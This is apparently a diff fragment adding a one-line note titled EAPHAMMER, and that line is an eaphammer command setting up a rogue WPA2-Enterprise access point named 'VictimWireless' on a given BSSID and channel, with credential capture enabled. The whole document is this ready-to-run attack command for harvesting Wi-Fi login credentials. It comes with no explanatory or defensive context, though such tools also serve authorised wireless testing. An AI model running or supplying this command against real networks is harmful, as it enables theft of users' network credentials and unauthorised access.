@@ -1,0 +1,3 @@
+EAPHAMMER
+./eaphammer -i wlan0 --bssid 00:a2:ee:90:05:af --channel 1 --auth ttls --wpa 2 --essid VictimWireless --creds
+
